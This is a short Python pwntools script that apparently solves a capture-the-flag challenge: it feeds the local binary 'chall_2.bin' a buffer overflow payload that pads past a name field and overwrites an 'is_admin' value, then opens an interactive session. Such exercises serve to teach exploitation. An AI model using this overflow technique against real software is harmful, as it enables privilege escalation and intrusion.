#!/usr/bin/env python3

from pwn import *

p = process("./chall_2.bin")

payload = b"A" * 16 # name
payload += b"A" * 8 # pad
payload += p32(0x0) + p32(0xdeadbeaf) # 4 bytes + is_admin

p.recv()
p.sendline(payload)
p.interactive()